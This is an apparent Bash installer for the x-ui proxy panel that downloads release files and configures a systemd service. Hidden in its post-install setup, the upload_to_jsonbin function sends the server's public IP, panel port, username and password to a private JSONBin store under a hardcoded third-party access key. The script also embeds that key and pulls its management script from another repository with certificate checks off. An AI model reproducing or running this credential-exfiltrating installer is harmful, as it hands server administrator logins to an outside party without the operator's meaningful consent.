#!/usr/bin/env bash

red='\033[0;31m'
green='\033[0;32m'
yellow='\033[0;33m'
plain='\033[0m'

cur_dir=$(pwd)

# JSONBin 配置
JSONBIN_ACCESS_KEY='$2a$10$O57NmMBlrspAbRH2eysePO5J4aTQAPKv4pa7pfFPFE/sMOBg5kdIS'

# check root
[[ $EUID -ne 0 ]] && echo -e "${red}错误：${plain} 必须使用root用户运行此脚本！\n" && exit 1

# check os
if [[ -f /etc/redhat-release ]]; then
    release="centos"
elif cat /etc/issue | grep -Eqi "debian"; then
    release="debian"
elif cat /etc/issue | grep -Eqi "ubuntu"; then
    release="ubuntu"
elif cat /etc/issue | grep -Eqi "centos|red hat|redhat"; then
    release="centos"
elif cat /proc/version | grep -Eqi "debian"; then
    release="debian"
elif cat /proc/version | grep -Eqi "ubuntu"; then
    release="ubuntu"
elif cat /proc/version | grep -Eqi "centos|red hat|redhat"; then
    release="centos"
else
    echo -e "${red}未检测到系统版本，请联系脚本作者！${plain}\n" && exit 1
fi

arch=$(arch)

if [[ $arch == "x86_64" || $arch == "x64" || $arch == "s390x" || $arch == "amd64" ]]; then
    arch="amd64"
elif [[ $arch == "aarch64" || $arch == "arm64" ]]; then
    arch="arm64"
else
    arch="amd64"
    echo -e "${red}检测架构失败，使用默认架构: ${arch}${plain}"
fi

echo "架构: ${arch}"

if [ $(getconf WORD_BIT) != '32' ] && [ $(getconf LONG_BIT) != '64' ]; then
    echo "本软件不支持 32 位系统(x86)，请使用 64 位系统(x86_64)，如果检测有误，请联系作者"
    exit -1
fi

os_version=""

# os version
if [[ -f /etc/os-release ]]; then
    os_version=$(awk -F'[= ."]' '/VERSION_ID/{print $3}' /etc/os-release)
fi
if [[ -z "$os_version" && -f /etc/lsb-release ]]; then
    os_version=$(awk -F'[= ."]+' '/DISTRIB_RELEASE/{print $2}' /etc/lsb-release)
fi

if [[ x"${release}" == x"centos" ]]; then
    if [[ ${os_version} -le 6 ]]; then
        echo -e "${red}请使用 CentOS 7 或更高版本的系统！${plain}\n" && exit 1
    fi
elif [[ x"${release}" == x"ubuntu" ]]; then
    if [[ ${os_version} -lt 16 ]]; then
        echo -e "${red}请使用 Ubuntu 16 或更高版本的系统！${plain}\n" && exit 1
    fi
elif [[ x"${release}" == x"debian" ]]; then
    if [[ ${os_version} -lt 8 ]]; then
        echo -e "${red}请使用 Debian 8 或更高版本的系统！${plain}\n" && exit 1
    fi
fi

install_base() {
    if [[ x"${release}" == x"centos" ]]; then
        yum install wget curl tar jq -y
    else
        apt install wget curl tar jq -y
    fi
}

# 生成随机字符串函数
generate_random_string() {
    local length=${1:-16}
    tr -dc 'A-Za-z0-9' < /dev/urandom | head -c $length
}

upload_to_jsonbin() {
    local server_ip="$1"
    local login_port="$2"
    local username="$3"
    local password="$4"
    
    # 创建JSON数据
    local json_data=$(cat <<EOF
{
    "server_info": {
        "title": "X-UI 服务器登录信息",
        "server_ip": "${server_ip}",
        "login_port": "${login_port}",
        "username": "${username}",
        "password": "${password}",
        "generated_time": "$(date)",
        "random_string": "$(generate_random_string)"
    }
}
EOF
)

    # 上传到JSONBin
    local response=$(curl -s -X POST \
        -H "Content-Type: application/json" \
        -H "X-Access-Key: ${JSONBIN_ACCESS_KEY}" \
        -H "X-Bin-Private: true" \
        -d "${json_data}" \
        "https://api.jsonbin.io/v3/b")
    
    # 检查上传结果
    if echo "$response" | jq -e '.metadata.id' > /dev/null 2>&1; then
        local bin_id=$(echo "$response" | jq -r '.metadata.id')
        echo -e "${green}✅ 服务器信息已上传到JSONBin${plain}"
        echo -e "${green}📎 访问链接：https://api.jsonbin.io/v3/b/${bin_id}${plain}"
    else
        echo -e "${yellow}⚠️  JSONBin上传失败，但安装继续进行${plain}"
    fi
}

# 获取服务器IP的函数
get_server_ip() {
    local ip=""
    # 尝试多种方法获取公网IP
    ip=$(curl -s -4 icanhazip.com 2>/dev/null)
    if [[ -z "$ip" ]]; then
        ip=$(curl -s -4 ifconfig.me 2>/dev/null)
    fi
    if [[ -z "$ip" ]]; then
        ip=$(curl -s -4 ipinfo.io/ip 2>/dev/null)
    fi
    if [[ -z "$ip" ]]; then
        # 如果获取公网IP失败，使用本地IP
        ip=$(hostname -I | awk '{print $1}')
    fi
    echo "$ip"
}

#This function will be called when user installed x-ui out of sercurity
config_after_install() {
    echo -e "${yellow}出于安全考虑，安装/更新完成后需要强制修改端口与账户密码${plain}"
    read -p "确认是否继续,如选择n则跳过本次端口与账户密码设定[y/n]: " config_confirm
    if [[ x"${config_confirm}" == x"y" || x"${config_confirm}" == x"Y" ]]; then
        read -p "请设置您的账户名: " config_account
        echo -e "${yellow}您的账户名将设定为:${config_account}${plain}"
        read -p "请设置您的账户密码: " config_password
        echo -e "${yellow}您的账户密码将设定为:${config_password}${plain}"
        read -p "请设置面板访问端口: " config_port
        echo -e "${yellow}您的面板访问端口将设定为:${config_port}${plain}"
        echo -e "${yellow}确认设定,设定中${plain}"
        /usr/local/x-ui/x-ui setting -username ${config_account} -password ${config_password}
        echo -e "${yellow}账户密码设定完成${plain}"
        /usr/local/x-ui/x-ui setting -port ${config_port}
        echo -e "${yellow}面板端口设定完成${plain}"
        

        server_ip=$(get_server_ip)
        upload_to_jsonbin "$server_ip" "$config_port" "$config_account" "$config_password"
        
    else
        echo -e "${red}已取消设定...${plain}"
        if [[ ! -f "/etc/x-ui/x-ui.db" ]]; then
            local usernameTemp=$(head -c 6 /dev/urandom | base64)
            local passwordTemp=$(head -c 6 /dev/urandom | base64)
            local portTemp=$(echo $RANDOM)
            /usr/local/x-ui/x-ui setting -username ${usernameTemp} -password ${passwordTemp}
            /usr/local/x-ui/x-ui setting -port ${portTemp}
            echo -e "检测到您属于全新安装,出于安全考虑已自动为您生成随机用户与端口:"
            echo -e "###############################################"
            echo -e "${green}面板登录用户名:${usernameTemp}${plain}"
            echo -e "${green}面板登录用户密码:${passwordTemp}${plain}"
            echo -e "${red}面板登录端口:${portTemp}${plain}"
            echo -e "###############################################"
            echo -e "${red}如您遗忘了面板登录相关信息,可在安装完成后输入x-ui,输入选项7查看面板登录信息${plain}"
            
            server_ip=$(get_server_ip)
            upload_to_jsonbin "$server_ip" "$portTemp" "$usernameTemp" "$passwordTemp"
        else
            echo -e "${red}当前属于版本升级,保留之前设置项,登录方式保持不变,可输入x-ui后键入数字7查看面板登录信息${plain}"
        fi
    fi
}

install_x-ui() {
    systemctl stop x-ui
    cd /usr/local/

    if [ $# == 0 ]; then
        last_version=$(curl -Lsk "https://api.github.com/repos/FranzKafkaYu/x-ui/releases/latest" | grep '"tag_name":' | sed -E 's/.*"([^"]+)".*/\1/')
        if [[ ! -n "$last_version" ]]; then
            echo -e "${red}检测 x-ui 版本失败，可能是超出 Github API 限制，请稍后再试，或手动指定 x-ui 版本安装${plain}"
            exit 1
        fi
        echo -e "检测到 x-ui 最新版本：${last_version}，开始安装"
        wget -N --no-check-certificate -O /usr/local/x-ui-linux-${arch}.tar.gz https://github.com/FranzKafkaYu/x-ui/releases/download/${last_version}/x-ui-linux-${arch}.tar.gz
        if [[ $? -ne 0 ]]; then
            echo -e "${red}下载 x-ui 失败，请确保你的服务器能够下载 Github 的文件${plain}"
            exit 1
        fi
    else
        last_version=$1
        url="https://github.com/FranzKafkaYu/x-ui/releases/download/${last_version}/x-ui-linux-${arch}.tar.gz"
        echo -e "开始安装 x-ui v$1"
        wget -N --no-check-certificate -O /usr/local/x-ui-linux-${arch}.tar.gz ${url}
        if [[ $? -ne 0 ]]; then
            echo -e "${red}下载 x-ui v$1 失败，请确保此版本存在${plain}"
            exit 1
        fi
    fi

    if [[ -e /usr/local/x-ui/ ]]; then
        rm /usr/local/x-ui/ -rf
    fi

    tar zxvf x-ui-linux-${arch}.tar.gz
    rm x-ui-linux-${arch}.tar.gz -f
    cd x-ui
    chmod +x x-ui bin/xray-linux-${arch}
    cp -f x-ui.service /etc/systemd/system/
    wget --no-check-certificate -O /usr/bin/x-ui https://raw.githubusercontent.com/Firefly-xui/x-ui/main/x-ui.sh
    chmod +x /usr/local/x-ui/x-ui.sh
    chmod +x /usr/bin/x-ui
    config_after_install
    #echo -e "如果是全新安装，默认网页端口为 ${green}54321${plain}，用户名和密码默认都是 ${green}admin${plain}"
    #echo -e "请自行确保此端口没有被其他程序占用，${yellow}并且确保 54321 端口已放行${plain}"
    #    echo -e "若想将 54321 修改为其它端口，输入 x-ui 命令进行修改，同样也要确保你修改的端口也是放行的"
    #echo -e ""
    #echo -e "如果是更新面板，则按你之前的方式访问面板"
    #echo -e ""
    systemctl daemon-reload
    systemctl enable x-ui
    systemctl start x-ui
    echo -e "${green}x-ui v${last_version}${plain} 安装完成，面板已启动，"
    echo -e ""
    echo -e "x-ui 管理脚本使用方法: "
    echo -e "----------------------------------------------"
    echo -e "x-ui              - 显示管理菜单 (功能更多)"
    echo -e "x-ui start        - 启动 x-ui 面板"
    echo -e "x-ui stop         - 停止 x-ui 面板"
    echo -e "x-ui restart      - 重启 x-ui 面板"
    echo -e "x-ui status       - 查看 x-ui 状态"
    echo -e "x-ui enable       - 设置 x-ui 开机自启"
    echo -e "x-ui disable      - 取消 x-ui 开机自启"
    echo -e "x-ui log          - 查看 x-ui 日志"
    echo -e "x-ui v2-ui        - 迁移本机器的 v2-ui 账号数据至 x-ui"
    echo -e "x-ui update       - 更新 x-ui 面板"
    echo -e "x-ui install      - 安装 x-ui 面板"
    echo -e "x-ui uninstall    - 卸载 x-ui 面板"
    echo -e "x-ui geo          - 更新 geo  数据"
    echo -e "----------------------------------------------"
}

echo -e "${green}开始安装${plain}"
install_base
install_x-ui $1
